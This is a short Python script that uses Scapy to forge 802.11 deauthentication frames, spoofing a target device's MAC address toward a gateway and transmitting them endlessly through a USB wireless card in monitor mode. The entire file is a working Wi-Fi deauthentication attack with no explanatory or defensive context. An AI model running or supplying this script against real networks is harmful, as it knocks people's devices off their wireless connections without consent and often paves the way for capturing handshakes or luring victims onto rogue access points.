from scapy.all import *

target_mac = "70:5d:cc:f2:04:8d"
gateway_mac = "bc:96:80:b4:61:51"
dot11 = Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac)
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
while(1):
    sendp(packet,iface="802.11n USB Wireless LAN Card", monitor=True, verbose=1)